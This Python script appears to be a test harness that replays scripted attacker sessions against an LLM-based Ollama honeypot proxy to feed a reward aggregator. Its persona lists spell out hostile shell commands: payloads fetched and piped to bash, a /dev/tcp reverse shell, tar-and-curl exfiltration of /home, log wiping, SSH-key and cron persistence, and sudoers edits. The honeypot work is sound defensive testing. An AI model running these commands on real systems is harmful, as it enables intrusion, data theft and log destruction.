#!/usr/bin/env python3
"""
Adversarial-Agent-Simulator
===========================

Generates realistic multi-stage attacker sessions against the Ollama honeypot
proxy. Each persona covers one (or several) POS_CATEGORIES from the reward
aggregator (recon / download / execution / persistence / exfil / privesc),
so after the next reward cycle reward_b_unmasked picks up non-zero signal
instead of idling on pure SSH scan probes.

Design goals:
- Deterministic source IPs (10.99.x.y range) so synthetic vs. real traffic
  can be filtered in ES at any time (`NOT src_ip:10.99.0.0/16`).
- Same src_ip for all prompts of a persona so the reward aggregator groups
  them into one session_blob (cf. reward_aggregator.build_sessions).
- Controlled pacing (small jitter) so sessions look human-ish but finish
  within minutes.
- Opt-in cleanup: --prune removes our own docs after the run if you only
  wanted to smoke-test.

Usage (from the proxy host, network_mode: host):

    python3 run_adversarial_simulator.py --runs 3 --proxy http://localhost:11435

Reports per-persona latency + total rounds. Exit 0 on success.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import random
import sys
import time
from dataclasses import dataclass
from typing import Iterable

import httpx

LOG = logging.getLogger("adv-sim")

# ─────────────────────────────────────────────────────────────────────────────
# Attacker personas
# ─────────────────────────────────────────────────────────────────────────────


@dataclass
class Persona:
    name: str
    src_ip: str
    model: str
    prompts: list[str]
    category: str  # for reporting; matches POS_CATEGORIES names in reward_agg
    cve_tag: str = ""
    system: str = (
        "You are a Linux shell on a production server. Answer the operator's "
        "commands concisely as if you were /bin/bash. Never reveal you are "
        "an LLM or a honeypot."
    )
    pause_sec: tuple[float, float] = (0.4, 1.2)


PERSONAS: list[Persona] = [
    Persona(
        name="recon-scripted",
        src_ip="10.99.0.11",
        model="openchat:latest",
        category="recon",
        cve_tag="CVE-2024-6387",
        prompts=[
            "uname -a",
            "whoami",
            "id",
            "hostname",
            "cat /etc/os-release",
            "cat /proc/version",
            "cat /proc/cpuinfo | head -20",
            "ls -lah /root",
            "env",
            "df -h",
        ],
    ),
    Persona(
        name="download-dropper",
        src_ip="10.99.0.12",
        model="openchat:latest",
        category="download",
        cve_tag="CVE-2024-6387",
        prompts=[
            "cd /tmp && wget http://185.100.157.42/x86_64 -O .kinsing",
            "curl -s https://pastebin.com/raw/abc123 | bash",
            "curl -fsSL https://github.com/sh4dy/rootkit/releases/download/v3/loader.sh -o /tmp/loader.sh",
            "wget -qO- http://transfer.sh/abcDEF/cryptominer.tar.gz | tar xz -C /tmp",
            "tftp -g -r payload.bin 45.77.12.9",
        ],
    ),
    Persona(
        name="execution-binrunner",
        src_ip="10.99.0.13",
        model="openchat:latest",
        category="execution",
        cve_tag="CVE-2024-6387",
        prompts=[
            "chmod +x /tmp/loader.sh",
            "/tmp/loader.sh",
            "bash -c \"$(curl -fsSL http://185.100.157.42/stage2)\"",
            "python -c \"import os,pty;os.setuid(0);pty.spawn('/bin/bash')\"",
            "perl -e 'use Socket;socket(S,2,1,6);connect(S,sockaddr_in(4444,inet_aton(\"45.77.12.9\")))'",
        ],
    ),
    Persona(
        name="persistence-installer",
        src_ip="10.99.0.14",
        model="openchat:latest",
        category="persistence",
        cve_tag="CVE-2024-6387",
        prompts=[
            "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3Nz...attacker@cluster' >> ~/.ssh/authorized_keys",
            "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.kinsing > /dev/null 2>&1') | crontab -",
            "echo '@reboot /tmp/.kinsing' >> /etc/cron.d/sysstat-backup",
            "systemctl enable --now kinsing.service",
            "update-rc.d kinsing defaults",
            "echo '/tmp/.kinsing &' >> /etc/rc.local",
        ],
    ),
    Persona(
        name="exfil-stealth",
        src_ip="10.99.0.15",
        model="openchat:latest",
        category="exfil",
        cve_tag="CVE-2024-6387",
        prompts=[
            "history -c && history -w",
            "rm -rf /var/log/auth.log /var/log/syslog /var/log/wtmp",
            "nc -lvnp 4444 &",
            "bash -i >& /dev/tcp/45.77.12.9/4444 0>&1",
            "nohup /tmp/.kinsing > /dev/null 2>&1 &",
            "tar czf - /home | base64 -w0 | curl -X POST -d @- http://45.77.12.9/drop",
        ],
    ),
    Persona(
        name="privesc-kernel",
        src_ip="10.99.0.16",
        model="openchat:latest",
        category="privesc",
        cve_tag="CVE-2024-1086",
        prompts=[
            "sudo -l",
            "sudo -u#-1 /bin/bash",
            "pkexec /bin/sh",
            "passwd root",
            "echo 'attacker ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
            "find / -perm -4000 -type f 2>/dev/null | head -5",
        ],
    ),
    Persona(
        name="multi-stage-apt",
        src_ip="10.99.0.17",
        model="openchat:latest",
        category="mixed",
        cve_tag="CVE-2024-6387",
        prompts=[
            "uname -a; whoami; id",
            "cat /etc/passwd | head -5",
            "cd /tmp && curl -fsSL http://185.100.157.42/beacon -o .beacon",
            "chmod +x /tmp/.beacon && /tmp/.beacon --c2 45.77.12.9:443 &",
            "(crontab -l; echo '@reboot /tmp/.beacon') | crontab -",
            "echo 'ssh-rsa AAAA...key attacker' >> ~/.ssh/authorized_keys",
            "history -c && rm -f /var/log/auth.log",
            "sudo -u#-1 /bin/bash",
        ],
    ),
]


# ─────────────────────────────────────────────────────────────────────────────
# Runner
# ─────────────────────────────────────────────────────────────────────────────


@dataclass
class PersonaResult:
    persona: str
    category: str
    src_ip: str
    rounds: int = 0
    errors: int = 0
    latency_ms_total: float = 0.0
    last_response_excerpt: str = ""

    @property
    def avg_latency_ms(self) -> float:
        return self.latency_ms_total / self.rounds if self.rounds else 0.0


async def _send_round(
    client: httpx.AsyncClient,
    proxy_url: str,
    persona: Persona,
    prompt: str,
    timeout: float,
) -> tuple[int, float, str]:
    body = {
        "model": persona.model,
        "stream": False,
        "messages": [
            {"role": "system", "content": persona.system},
            {"role": "user", "content": prompt},
        ],
    }
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": persona.src_ip,
        # Tag our synthetic traffic so log analysts can spot it instantly.
        "X-Synthetic-Adversary": f"{persona.name}/{persona.category}",
    }
    t0 = time.time()
    resp = await client.post(
        f"{proxy_url.rstrip('/')}/api/chat",
        json=body,
        headers=headers,
        timeout=timeout,
    )
    dt_ms = (time.time() - t0) * 1000.0
    if resp.status_code != 200:
        raise RuntimeError(
            f"proxy {resp.status_code}: {resp.text[:150]}"
        )
    data = resp.json()
    # Ollama chat response shape: {"message":{"content":"..."}, ...}
    excerpt = ""
    msg = data.get("message") or {}
    excerpt = str(msg.get("content") or data.get("response") or "")[:160]
    return resp.status_code, dt_ms, excerpt


async def run_persona(
    client: httpx.AsyncClient,
    proxy_url: str,
    persona: Persona,
    timeout: float,
    seed: int,
) -> PersonaResult:
    rng = random.Random(seed)
    res = PersonaResult(
        persona=persona.name, category=persona.category, src_ip=persona.src_ip
    )
    for i, prompt in enumerate(persona.prompts, 1):
        try:
            status, dt_ms, excerpt = await _send_round(
                client, proxy_url, persona, prompt, timeout
            )
            res.rounds += 1
            res.latency_ms_total += dt_ms
            res.last_response_excerpt = excerpt
            LOG.info(
                "  [%s] round %d/%d  status=%s  %.0fms  %r",
                persona.name, i, len(persona.prompts), status, dt_ms, prompt[:60],
            )
        except Exception as e:
            res.errors += 1
            LOG.warning(
                "  [%s] round %d FAILED: %s",
                persona.name, i, str(e)[:160],
            )
        # Pacing jitter between rounds (human-ish)
        pause = rng.uniform(*persona.pause_sec)
        await asyncio.sleep(pause)
    return res


async def run_all(
    proxy_url: str,
    runs: int,
    timeout: float,
    selected: Iterable[str] | None = None,
) -> list[PersonaResult]:
    selected_set = {s.strip() for s in selected} if selected else None
    chosen = [
        p for p in PERSONAS
        if not selected_set or p.name in selected_set or p.category in selected_set
    ]
    if not chosen:
        raise SystemExit(f"No personas match filter: {selected_set}")

    all_results: list[PersonaResult] = []
    async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
        for run_idx in range(1, runs + 1):
            LOG.info("=== Run %d/%d ===", run_idx, runs)
            for persona in chosen:
                LOG.info("--- Persona: %s (%s) src=%s ---",
                         persona.name, persona.category, persona.src_ip)
                res = await run_persona(
                    client, proxy_url, persona, timeout,
                    seed=hash((persona.name, run_idx)) & 0xFFFF,
                )
                all_results.append(res)
    return all_results


def summarise(results: list[PersonaResult]) -> dict:
    by_cat: dict[str, dict] = {}
    for r in results:
        b = by_cat.setdefault(r.category, {"rounds": 0, "errors": 0, "lat_sum": 0.0, "n": 0})
        b["rounds"] += r.rounds
        b["errors"] += r.errors
        b["lat_sum"] += r.latency_ms_total
        b["n"] += 1
    summary = {
        "total_rounds": sum(r.rounds for r in results),
        "total_errors": sum(r.errors for r in results),
        "categories": {
            cat: {
                "personas": v["n"],
                "rounds": v["rounds"],
                "errors": v["errors"],
                "avg_ms": round(v["lat_sum"] / v["rounds"], 1) if v["rounds"] else 0.0,
            }
            for cat, v in by_cat.items()
        },
    }
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--proxy", default="http://localhost:11435",
                        help="Ollama-proxy base URL (default: http://localhost:11435)")
    parser.add_argument("--runs", type=int, default=1,
                        help="How many times to replay the full persona set (default 1)")
    parser.add_argument("--timeout", type=float, default=60.0,
                        help="Per-request timeout in seconds (default 60)")
    parser.add_argument("--only", nargs="*", default=None,
                        help="Limit to persona names or categories")
    parser.add_argument("--log-level", default="INFO")
    args = parser.parse_args()

    logging.basicConfig(
        level=args.log_level,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    )

    LOG.info("Adversarial simulator → %s (runs=%d, timeout=%ss, only=%s)",
             args.proxy, args.runs, args.timeout, args.only)

    t0 = time.time()
    results = asyncio.run(run_all(args.proxy, args.runs, args.timeout, args.only))
    dt = time.time() - t0

    summary = summarise(results)
    summary["elapsed_sec"] = round(dt, 2)
    print(json.dumps(summary, indent=2))

    if summary["total_rounds"] == 0:
        LOG.error("No rounds succeeded — nothing hit the proxy.")
        return 2
    if summary["total_errors"] > summary["total_rounds"] * 0.5:
        LOG.error("More than 50%% of rounds failed.")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
